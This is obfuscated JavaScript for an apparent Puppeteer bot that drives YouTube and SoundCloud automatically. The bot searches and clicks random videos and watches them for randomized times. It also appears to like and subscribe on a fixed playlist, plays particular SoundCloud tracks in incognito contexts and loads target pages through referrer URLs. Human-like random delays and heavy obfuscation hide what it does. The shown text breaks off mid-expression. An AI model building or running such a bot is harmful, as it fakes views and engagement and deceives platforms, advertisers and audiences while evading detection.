const a1 = d,
  a0 = c,
  Z = b;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x31 * 0x9 + 0x143a + 0xaf9 * -0x2))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](0x4fd * 0x2 + -0x2610 + 0x1c16), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0x3d * -0x36f + 0x34aa + -0x90ed + (0xfe6 + 0x2 * -0xf0 + 0x2c92) * random()) : await standardWaitForNetIdle(f), await wait(0x3 * 0x4d3 + -0x139 * 0xd + 0x14f4 + (0x4d34 + -0xd7 * -0x19 + -0x3b23) * random()), -0x4cf * 0x1 + 0xa0c + -0x53c;
}
async function standardWaitForNetIdle(f) {
  return await wait(0xe * -0xb3 + 0x1 * 0xe6b + -0x7 * -0x221), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x2 * -0x107 + 0xf0d * 0x2 + -0x2027;
}
async function randomWait() {
  return await wait(0x617 * -0x6 + 0x466 + 0x4 * 0xceb + (0xf * 0x1c9 + 0xa0b * -0x2 + 0xad * 0x13) * random()), 0x1 * 0xc5b + -0x21b3 * 0x1 + 0x1559;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0x1 * 0x664 + -0xef * 0x1 + 0x7d * 0xf, 0x808 + -0x1bef + 0x13ee), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0x63c4 + 0x9ef9 + -0x185d) * getRandomInt(0x3 * -0x55c + 0x25 * -0x71 + 0x1 * 0x206b, -0x1a45 * 0x1 + 0xb0e + 0x5 * 0x30c), h)), 0xf07 * 0x2 + -0x1b4f + 0x1a * -0x1b;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0x269 * 0x4 + 0x2 * 0x2f6 + 0x4 * 0xee;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0x9 * 0x1d + -0x17ab + -0x387 * -0x7]['split']('\x20');
    for (let k = -0x6c0 + 0x1 * 0x665 + 0x1 * 0x5b; k < i['length']; k += -0x24df * 0x1 + -0xacd + 0x2fae)
      j += i[k] * h[i[k + (0x1a7a + 0x209 + -0x59 * 0x52)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x25b0 + -0x1 * 0xb2b + 0x30e1)['map'](l => Array['from'](l['children']))['flat'](0x1bb * -0xd + -0x19f * -0x1 + 0x14e1)['map'](l => l['childNodes'][0x66 * 0x55 + 0x24a * 0xc + -0x8c3 * 0x7]['childNodes'][0xb * 0x14d + 0x72b + 0x157a * -0x1]['childNodes'][-0x9ea * 0x1 + -0x19a4 + 0x238f]['childNodes'][0x8 * 0x205 + 0x1aaa + -0x105 * 0x2a]['childNodes'][0x29 * 0xd9 + -0x1 * 0x249b + 0x1db]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x5 * -0x2a1 + -0x3 * 0x351 + 0x1b00, 0x2173 + -0xc7e + -0x16d)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0xc * 0x638 + 0x359d + -0x3 * -0x1a89);
  const h = await getMaxTime(f),
    i = Math['min']((-0x1 * 0x163d + -0x157ed + 0xf66 * 0x27) * getRandomInt(0x48e + 0xe2a + -0x12b6, -0x433 + 0xe4b + -0xa13), h);
  return await wait(i), 0x1b6b + 0x2561 + -0x40cb;
}
async function frontScreenActions(f) {
  const R = b;
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f[R(0x14, 'Roum')](() => {
    const S = b;
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math[S(0x19, '01Bd')]() * h['length'])])['children'][-0xb * -0xa9 + 0x1 * 0x22f4 + 0x6b * -0x65]['children'][0x2136 * -0x1 + -0x85f * 0x2 + -0xc7d * -0x4]['children'][0x2 * 0x11f3 + -0x110e + -0x324 * 0x6]['children'][0x1 * -0x1da0 + 0x8ee + -0x2 * -0xa59]['children'][-0x7 * 0x49d + 0x1c0f * -0x1 + 0x1 * 0x3c5a]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x7d9 + -0x2425 + -0x73 * -0x3f;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    const T = b;
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j[T(0x7, 'HtOA')](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x97b + 0x29f + -0xbb6 + (0x39 * 0x1f + -0xbd6 + -0x65 * -0xd) * random()
  }), await wait(-0x131 * -0x14 + -0x1bf * -0x6 + -0x29 * 0xca + (0x98f + 0x1967 + -0x21ca) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0xb * 0xd + 0x2203 + 0x1c * -0x13c]['childNodes'][0x178c + -0x5d * 0x6b + 0xf54]['childNodes'][-0x1fc + -0x216e + 0x236b]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0xa * -0x158 + -0x5c + 0xdd1]['childNodes'][-0x2 * -0x742 + 0x1e9f + -0x907 * 0x5]['childNodes'][0x7c6 + 0x153f + -0x425 * 0x7]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0x11 * -0x79 + 0xa * 0x175 + -0x169a),
          r = -0xc1f * -0x1 + 0x5 * -0x5d9 + -0x139 * -0xe;
        for (let u = -0x1739 + -0x14a3 + 0x2bdc; u < q['length']; u += 0x6d * 0x47 + -0x2531 + 0x6f8)
          r += q[u] * k[q[u + (0x218b * 0x1 + 0xbb7 + -0x23 * 0x14b)]];
        return r;
      }(n);
  });
  await wait((0x8b * 0x89 + -0x402a + -0x1 * -0x305f) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x1f3 * 0xb3 + 0xb8ad + 0x18e9c) * getRandomInt(-0x74 * 0x12 + 0x21d9 + 0x8 * -0x336, 0x1237 + -0x1c72 + 0xa45), h + (-0xf8 + 0x1 * -0x45d + 0x5 * 0x4f9));
  return await wait(i), 0x1615 + -0xb49 * 0x3 + -0xbc7 * -0x1;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x321 * -0x5 + 0x817 + 0xd9 * -0x1c);
    let h = e[f];
    if (c['fEMwAH'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x4a0 * -0x3 + 0x2512 + -0xb99 * 0x2, r, s, t = 0x1 * -0x393 + 0x481 * 0x1 + 0x11 * -0xe; s = m['charAt'](t++); ~s && (r = q % (0x1 * -0x80f + 0xf7a + 0x17b * -0x5) ? r * (0x1 * -0x6a3 + -0x11 * 0x9f + 0x1172) + s : s, q++ % (-0x268e + 0x54d + 0x1 * 0x2145)) ? o += String['fromCharCode'](-0x1a6c + 0x3 * 0x4d3 + -0x679 * -0x2 & r >> (-(-0x9 * 0xdf + -0x225 * -0x12 + -0x1ec1) * q & -0x4cf * 0x1 + 0xa0c + -0x537)) : 0xe * -0xb3 + 0x1 * 0xe6b + -0x5 * 0xed) {
          s = n['indexOf'](s);
        }
        for (let u = -0x2 * -0x107 + 0xf0d * 0x2 + -0x2028, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x617 * -0x6 + 0x466 + 0x12 * 0x1ca))['slice'](-(0xf * 0x1c9 + 0xa0b * -0x2 + 0x3b * -0x1d));
        }
        return decodeURIComponent(p);
      };
      c['zPJbQo'] = i, b = arguments, c['fEMwAH'] = !![];
    }
    const j = e[0x1 * 0xc5b + -0x21b3 * 0x1 + 0x1558],
      k = f + j,
      l = b[k];
    return !l ? (h = c['zPJbQo'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function keyWatch(f) {
  const U = d;
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x1c7b + -0x1d3e + 0x3 * 0x41), log(U(0xe) + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0x256a * 0x1 + -0xd * 0x2fe + 0xd34 + (0xa * 0x8c + 0x7 * 0x2f6 + 0x1 * -0x164a) * Math['random']());
    });
  }, 0x3 * 0x119d + 0x28f2 + -0x1 * 0x4271);
  await wait(0x2a4aa + -0x81565 + 0xa049b);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x7eb * -0x29 + -0xd951 + 0x30854 * 0x1) * getRandomInt(-0x195 * 0x9 + 0xb0 * 0x34 + -0x157f, 0x6b * -0x4c + 0x2613 + -0x3 * 0x212)), clearInterval(h), 0x2 * -0x748 + -0x1897 + 0x2cc * 0xe;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0x2 * -0x105c + 0x1e01 + 0x2b7 * 0x1;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x6a5 + 0x49 * 0x11 + 0x1cd;
    await randomWait();
  }
  return 0x2611 + -0x2 * 0x3ae + -0x83 * 0x3c;
}

function fetchRandomSC() {
  const V = d;
  return Math['random']() <= -0x39e * 0x4 + -0x13 * 0x187 + 0x2b7d + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0x1c06 + -0x1 * -0x183f + -0x3445 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + V(0x11) + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x321 * -0x5 + 0x817 + 0xd9 * -0x1c);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0x9 * 0x32b + -0x1 * 0x2111 + 0x3d94 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0xd34 + 0x2 * 0xcff + -0xcca;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0xa332 + 0x8d * -0x52 + 0x39c0 + getRandomInt(0x4261 + -0xd8 * -0x2 + -0x979, 0x3862 + 0x6b7f + -0x2eb1 * 0x1));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x1bc7 + 0x1e44 + -0x27c * 0x1), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x12cb + -0x50b + 0x17d6;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0x1 * -0x1e49 + 0x13 * -0x32 + -0x9 * -0x3c7, -0x2310 + 0xdd7 + 0x156b * 0x1)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x13d2 + -0x2400 + -0xb5 * -0x5a + floor((-0x50 + 0xba1 * 0x1 + -0x769) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(0x29b4f4ac + -0x16533b3 * 0x4e + 0xc320cbde),
          0x422603 + -0xd4e60d * 0x1 + 0x112c00a,
          0x69e7 + -0x28d0 * 0x3 + 0xa3 * 0xe3,
          -0x12ed + -0x2 * 0xd69 + 0x2e3f * 0x1
        ], y = [
          0x1 * 0x1855 + -0x67 * 0x1b + 0xd60 * -0x1,
          -0x13 * 0xfc + 0x7 * -0x167 + 0x3 * 0x987,
          -0x13c7 * 0x1 + -0x1ed6 + 0x32a5,
          0x117d + -0x2 * 0x11a3 + 0x11c9
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0x1f67 + -0x1 * -0x1e87 + -0x3ded)['update'](K)[J]();
          };
        }, C = function() {
          const W = c;
          var J, K, L = B(W(0x0));
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x8a5 * 0x2 + 0x81c + 0x1 * -0x1966; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0x51 * -0x29 + 0x2e5 + -0xfde) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0x1be5 * -0x1 + -0x5f3 + 0x2 * -0xaf9] = A[-0x1373 + 0xde5 * 0x1 + -0x2 * -0x2cf] = A[0x1931 * -0x1 + -0x19f5 + 0x3327] = A[0x258d * -0x1 + 0x1c0b * 0x1 + 0x984] = A[0x807 * -0x3 + 0x1 * -0x2708 + 0xca0 * 0x5] = A[-0x1c97 * 0x1 + -0x417 + 0x87 * 0x3e] = A[-0x13ee * 0x1 + 0x25fb + -0x1208] = A[-0x8 * 0x49e + 0x9 * -0x205 + 0x3723] = A[0x1 * -0x2302 + -0x2 * 0x562 + 0x2dcd] = A[-0x2012 + -0x1d83 + 0x3d9d] = A[-0x11d * 0x5 + -0x1d01 + -0x229b * -0x1] = A[-0x2 * 0x727 + -0x173 * -0x9 + 0x14d] = A[-0xda1 + 0x8dd * 0x1 + 0x4cf * 0x1] = A[-0x52 * -0x1c + 0x1d6e + 0x2 * -0x132d] = A[0x19a9 * 0x1 + -0xbd8 + -0xdc4] = A[-0x1 * -0x5d7 + 0xa74 + -0x103d] = A[-0x109c * -0x2 + 0x20c3 + -0x41ec] = 0xb4e + -0x80f + -0x115 * 0x3, this['blocks'] = A) : this['blocks'] = [
                0xf45 + -0x3 * -0x536 + -0x1ee7,
                -0x197e + 0x8aa + 0x10d4,
                -0xa * 0xdd + 0x1484 + 0xbe2 * -0x1,
                0x1e9e * 0x1 + 0x1ff3 * -0x1 + 0x155,
                0x1e28 + 0x4e + -0xe * 0x22d,
                0x1b1 + -0xdeb + -0x2 * -0x61d,
                0x7a0 + 0x6d2 + -0x2b * 0x56,
                -0x2490 + -0x477 + 0x9 * 0x48f,
                0x1d99 + -0x1a50 * -0x1 + -0x1 * 0x37e9,
                -0x1bd * 0x3 + 0x2db * 0x2 + -0x7f,
                -0x38e + 0x3 * -0x953 + 0x1f87,
                -0x25b8 + 0x790 + 0x1e28,
                0x883 * -0x1 + 0x1e79 + 0x6 * -0x3a9,
                -0x1 * -0x20bd + 0x22d4 + -0x31 * 0x161,
                -0x5a4 + 0x2594 + 0xe * -0x248,
                0x89c + -0x92 * -0x17 + 0x67 * -0x36,
                0x2164 + -0x14ef + 0x3 * -0x427
              ], this['h0'] = 0xca51e384 + -0x1 * 0xac308c97 + -0x4923cc14 * -0x1, this['h1'] = 0x102044 + -0x133568f9d + 0x223141ae2, this['h2'] = 0xd4be879d + 0x6c703f76 + -0xa873ea15, this['h3'] = 0x13f3048d * -0x1 + -0x1 * 0x168a59cd + 0x4 * 0xeabecb4, this['h4'] = -0x76dced * -0x34a + 0x6ca * 0x1201f6 + -0x13d6111ae * 0x1, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x1 * -0x36a + -0x1b4f * -0x1 + -0x17e5 * 0x1, this['finalized'] = this['hashed'] = -0x1a9e + 0x58a + 0x1514, this['first'] = 0x11b9 + 0x1a68 + 0xb08 * -0x4;
            }
            ['update'](J) {
              const Y = d,
                X = b;
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = X(0xc, '!5F@') != typeof J) && J['constructo' + 'r'] === E[Y(0x16) + 'r'] && (J = new Uint8Array(J)), M = 0x1 * 0x11cb + 0x1e3e + -0x3009, O = J['length'] || 0x1158 + 0x706 + -0x185e, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x11b + -0x124d + -0x1f * -0x8e, P[-0x1 * 0x149f + -0x1776 + 0x2c15] = this['block'], P[-0xffc + 0x491 * -0x4 + 0x4 * 0x894] = P[-0x8e1 * -0x1 + -0x2036 + 0x1 * 0x1756] = P[0xe5 * -0x1b + -0x4 * -0x2fc + 0x7 * 0x1bf] = P[0x642 + 0x69d * -0x3 + 0xd98] = P[-0xc07 * 0x1 + 0x605 * 0x1 + -0x101 * -0x6] = P[0x8b5 * -0x3 + 0x120f + -0x815 * -0x1] = P[-0x210a + 0x1134 + 0xfdc] = P[0xbf * -0x2c + 0x108f + 0x254 * 0x7] = P[0x11 * -0x1a9 + -0x822 + 0x26d * 0xf] = P[0xa3 * -0x3 + -0x1962 + 0x1b54] = P[0x723 * 0x5 + 0x2 * -0xddc + -0x7ed] = P[-0x935 + 0xd7d * 0x1 + -0x43d] = P[-0x162e + 0x8e1 * 0x3 + -0x469] = P[0x191b + 0x24e6 * -0x1 + -0x8 * -0x17b] = P[-0x10 * 0x88 + -0x9fe + 0x128c] = P[-0x10 * 0x46 + 0xff0 + -0x1 * 0xb81] = 0xe13 + -0x21ee + 0x13db), K) {
                    for (N = this['start']; M < O && N < -0x6 * -0x2a7 + 0x7bf + -0x1769; ++M)
                      P[N >> 0x5 * -0x329 + -0x26b1 * 0x1 + 0x3680] |= J[M] << y[0xc28 + -0xb84 + -0xa1 * 0x1 & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x197b + -0x26d8 + -0x4093 * -0x1; ++M)
                      (L = J['charCodeAt'](M)) < 0x21 * -0x5 + 0x1e1c + -0x1 * 0x1cf7 ? P[N >> -0x2536 * -0x1 + -0x7f + -0x24b5] |= L << y[0xcac * 0x2 + 0x6 * -0x14d + 0x1 * -0x1187 & N++] : L < 0x1 * 0x11c5 + -0xbe9 + -0x2 * -0x112 ? (P[N >> -0x2 * -0xbb7 + 0xdcb + 0x7 * -0x551] |= (-0x11 * 0x20f + 0x11bc * 0x1 + 0x1 * 0x1203 | L >> 0x294 + 0x2 * -0x2d8 + -0x1 * -0x322) << y[-0x1 * -0x6ad + 0xdb * 0x7 + -0xca7 & N++], P[N >> 0x449 * 0x6 + 0x4be + -0x1e72] |= (0x5 * -0x68 + -0x769 + 0x1fd * 0x5 | -0x1b04 + -0x31d + 0x1e60 & L) << y[-0x412 + -0x1258 + 0x166d & N++]) : L < -0x3ab6 + -0xe56b * -0x1 + 0x1 * 0x2d4b || L >= 0x1 * -0x1544 + 0x11417 + -0x1ed3 ? (P[N >> -0xeec + -0x1ba6 + 0x2a94] |= (0x1cd6 + -0x24 + -0x1bd2 | L >> -0x29 * 0x79 + -0x7e8 * -0x2 + 0x25 * 0x19) << y[0x1b29 + -0x1057 * -0x1 + 0x9 * -0x4d5 & N++], P[N >> 0x977 + -0x5f * 0x23 + 0x388] |= (-0x662 + -0xe55 + 0x1537 * 0x1 | L >> 0x1 * -0x1537 + 0x730 + -0x6d * -0x21 & -0x25 * 0xd + -0xd5b + 0x1 * 0xf7b) << y[-0x1f49 + 0x39d + 0x1baf & N++], P[N >> 0x718 * -0x1 + 0x907 * 0x3 + -0x13fb] |= (-0xd42 * 0x1 + -0x2 * -0x59 + 0xd10 | -0x21c4 + -0x1e99 + 0x409c & L) << y[0x326 * 0xc + -0x8b0 + -0x1d15 & N++]) : (L = -0x1 * 0x1aea7 + -0x1a7e3 + -0x7 * -0x9ea6 + ((0x6ff + 0xac7 + -0xdc7 & L) << 0x1871 + 0x109c + -0x2903 | -0x150 + 0x3a5 * 0x9 + 0x12 * -0x187 & J['charCodeAt'](++M)), P[N >> 0x1b91 + 0x8 * -0x1c8 + 0x1 * -0xd4f] |= (-0xb35 + -0x36c + 0xf91 | L >> 0x633 * -0x5 + -0x1a77 + 0x3988) << y[-0xd4f * 0x1 + -0xafe * 0x2 + -0x11a7 * -0x2 & N++], P[N >> -0x303 * 0x7 + -0x4 * 0x912 + 0x395f] |= (0x261f + 0xba7 + 0x11 * -0x2e6 | L >> -0x104 * 0x19 + -0x1dc4 + 0x3734 & 0x3 * 0x321 + 0x71 * 0x39 + -0x224d * 0x1) << y[0xf3f + -0x220c * -0x1 + 0x18a4 * -0x2 & N++], P[N >> 0xd1 * 0x1d + 0x1a95 * -0x1 + 0x2ea] |= (0x17e7 * -0x1 + -0x1f5a + 0x37c1 | L >> 0x22c8 + 0x2580 + -0x4842 & 0x5 * -0x515 + 0x1cd5 + -0x32d) << y[0x1382 + 0xb81 + -0x1f00 & N++], P[N >> 0xdc9 + 0x1 * -0xdeb + -0x6 * -0x6] |= (-0x14c8 + -0x685 + -0xb * -0x287 | 0x92f * -0x4 + 0x1 * -0x2173 + 0x466e & L) << y[-0x1 * -0x1f4e + 0x2a0 * -0x7 + -0xceb & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x1 * 0xe27 + -0x7a9 * 0x3 + -0x16 * -0x1b3 ? (this['block'] = P[-0xa42 + 0x14b4 + 0x376 * -0x3], this['start'] = N - (-0x50 * 0x16 + 0xddb * -0x1 + -0x83 * -0x29), this['hash'](), this['hashed'] = 0x1 * 0x1cd6 + 0x1 * -0x1b61 + -0x174) : this['start'] = N;
                }
                return this['bytes'] > -0x13d5367 * -0x18d + -0x70 * 0x4dff9a + 0x3f8582 * -0x32e && (this['hBytes'] += this['bytes'] / (0x126b0a20 * -0x1a + 0x9bf0c * -0x1208 + 0x48 * 0xca5b854) << -0xdbf + -0x1781 + 0x2540, this['bytes'] = this['bytes'] % (0x5f1a0525 * -0x4 + -0x19b042f4 + 0xee6438 * 0x2c7)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0x20cc + 0x529 * -0x2 + 0x2b1f;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0x205c + -0x16ca + -0x982] = this['block'], J[K >> 0x388 * -0x3 + -0x29f + 0xd39] |= x[-0x2282 * -0x1 + -0x5fe * 0x2 + -0x1 * 0x1683 & K], this['block'] = J[0x2cf * -0xd + -0x1ca7 + 0x413a], K >= 0x1b70 + 0x134a + 0x2 * -0x1741 && (this['hashed'] || this['hash'](), J[0x1ce6 + -0x2114 + -0x1 * -0x42e] = this['block'], J[-0x1661 + 0x9b * 0x4 + 0x1405] = J[0x39a * -0x1 + -0xf6f + 0x985 * 0x2] = J[-0x23df * -0x1 + -0x26ad + 0x2d0] = J[-0x11 * 0xfe + 0x89 * -0x1 + 0x5ce * 0x3] = J[0x8 + 0x189 * -0x7 + 0x29 * 0x43] = J[-0x8 * -0xb1 + -0x1e7 + -0x39c] = J[-0x132 * 0x1e + -0xbfe + 0x1 * 0x2fe0] = J[-0x114c + 0x8b * -0xb + 0x174c] = J[0x2304 + 0x4 * -0x13f + 0x500 * -0x6] = J[-0x21e6 + -0x3 * -0xac1 + 0x1ac] = J[0xa70 + -0x641 + -0x1 * 0x425] = J[0x1a6a + 0x1434 + -0x2e93] = J[0x10ba + -0x2 * 0xffe + 0xf4e] = J[-0x34d + 0x3 * 0x273 + -0x5d * 0xb] = J[-0x233 * -0x2 + -0x362 * -0xa + -0x574 * 0x7] = J[-0x23d * 0xb + 0x148 + 0x1766] = -0x186b + 0x140 * 0xf + -0x5ab * -0x1), J[0x25b3 * -0x1 + 0xe * -0x3a + 0x28ed] = this['hBytes'] << 0x1c4d + -0x4 * 0x870 + 0x576 | this['bytes'] >>> -0x1 * 